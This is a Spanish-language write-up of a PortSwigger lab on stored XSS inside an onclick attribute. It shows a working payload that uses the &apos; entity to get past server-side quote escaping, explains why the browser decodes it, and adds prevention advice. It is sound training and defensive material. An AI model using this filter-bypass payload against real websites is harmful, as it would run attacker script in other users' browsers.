# 🧪 Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-Stored%20XSS%20%7C%20onclick-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
vulnerabilidad **Stored XSS** en la funcionalidad de comentarios. El campo
"Website" se refleja **dentro de un atributo `onclick`** en el HTML. El
servidor HTML-encodea `<>` y `"`, y escapa `'` y `\`. La solución pasa por
usar la **entidad HTML `&apos;`** (que el servidor no escapa) para romper
la cadena de JavaScript cuando el navegador la decodifica.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Análisis | Reflexión en `onclick` | Contexto: atributo JS |
| Escape | `'` → `\'`, `\` → `\\` | No se puede romper con `'` |
| Bypass | Usar `&apos;` | El navegador lo decodifica a `'` |
| Payload | `http://foo?&apos;-alert(1)-&apos;` | ✅ Lab resuelto |

---

## 🎯 Objetivo

Inyectar un comentario que ejecute `alert()` cuando se hace clic en el
nombre del autor.

---

## 📖 Contexto: entidades HTML y escape

Los filtros que solo escapan **caracteres literales** (`'`, `\`) son
vulnerables a las **entidades HTML** (`&apos;`, `&#39;`). El navegador
**decodifica las entidades antes de ejecutar JavaScript**, así que el
filtro no las ve.

| Carácter | Entidad HTML |
|----------|--------------|
| `'` | `&apos;` o `&#39;` |
| `"` | `&quot;` o `&#34;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |

**Estrategia:** si el servidor escapa `'`, usa `&apos;`. El navegador lo
decodificará a `'` **después** del filtro, rompiendo la cadena.

---

## 🔍 Análisis

### 1. Identificar el punto de reflexión

Al publicar un comentario, el campo **"Website"** se refleja en el HTML:

```html
<a href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">test</a>
```

**Contexto:** dentro de un **atributo `onclick`**, en una cadena JavaScript.

### 2. Comprobar el escape

- `<` y `>` → HTML-encoded (`&lt;`, `&gt;`).
- `"` → HTML-encoded (`&quot;`).
- `'` → escapado (`\'`).
- `\` → escapado (`\\`).

❌ No se puede romper la cadena con `'` ni `\`.

### 3. La clave: `&apos;`

El servidor **no escapa `&apos;`** porque no lo reconoce como carácter
peligroso. Pero el **navegador sí lo decodifica** a `'` antes de ejecutar
el JavaScript.

**Eso rompe la cadena.**

---

## 💥 Explotación

### 4. Construir el payload

En el campo **"Website"**:

```
http://foo?&apos;-alert(1)-&apos;
```

**Desglose:**

| Parte | Función |
|-------|---------|
| `http://foo?` | Relleno para que la URL sea válida. |
| `&apos;` | Entidad HTML que el navegador decodifica a `'`. **Rompe la cadena.** |
| `-alert(1)-` | Código JavaScript ejecutado. |
| `&apos;` | Cierra la nueva cadena (evita error de sintaxis). |

### 5. Cómo queda el HTML

```html
<a href="http://foo?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">test</a>
```

El navegador **decodifica `&apos;` a `'`** antes de ejecutar:

```javascript
var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');
```

1. El **primer `'`** cierra la cadena.
2. `-alert(1)-` se ejecuta.
3. El **segundo `'`** abre otra cadena.

### 6. Ejecutar el ataque

1. Publicar el comentario con el payload en **"Website"**.
2. Volver al post.
3. **Hacer clic en el nombre del autor**.
4. Se ejecuta `alert(1)`. ✅

---

## 📸 Evidencia

<img width="1181" height="347" alt="image" src="https://github.com/user-attachments/assets/ef6d7702-8e9f-43fd-989e-6c7368aea7b0" />


---

## 🧠 Lecciones aprendidas

1. **Las entidades HTML saltan los filtros de caracteres literales.** Si
   el servidor escapa `'` pero no `&apos;`, usa `&apos;`.
2. **El navegador decodifica entidades ANTES de ejecutar JavaScript.** Eso
   es lo que rompe el filtro.
3. **El campo correcto importa.** El payload va en el campo que se refleja
   en el `onclick` (Website), no en el que se muestra como texto (Name).
4. **Stored XSS es más peligroso que Reflected XSS.** Afecta a **todos**
   los visitantes, no solo a quien hace clic en un enlace.
5. **`onclick` es un contexto JS dentro de un atributo HTML.** Hay que
   romper **primero** el atributo (o la cadena JS), según el caso.
6. **En bug bounty, Stored XSS suele ser High/Critical** por su impacto.

---

## 🛡️ ¿Cómo se previene?

1. **Escapar `&` ANTES que cualquier otro carácter.** Eso convierte
   `&apos;` en `&amp;apos;`, que el navegador **no decodifica**.
2. **Escapar el input según el contexto**:
   - En HTML: `<`, `>`, `&`, `"`, `'`.
   - En atributos: `"`, `'`.
   - En JavaScript: `\`, `'`, `"`, `\n`, `\r`, `</script>`.
3. **Usar `encodeURIComponent()`** para URLs.
4. **Content Security Policy (CSP)** que bloquee scripts inline.
5. **No generar JavaScript dinámicamente** con input del usuario. Usar
   `data-*` attributes y leerlos desde JS con `dataset`.

---

## 🛠️ Herramientas utilizadas

- Burp Suite (Proxy, Repeater)
- Navegador web
- DevTools (Elements)

---

## 📚 Referencias

- [PortSwigger - Stored XSS into onclick](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
- [PortSwigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN - Character references](https://developer.mozilla.org/en-US/docs/Glossary/Character_reference)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-13
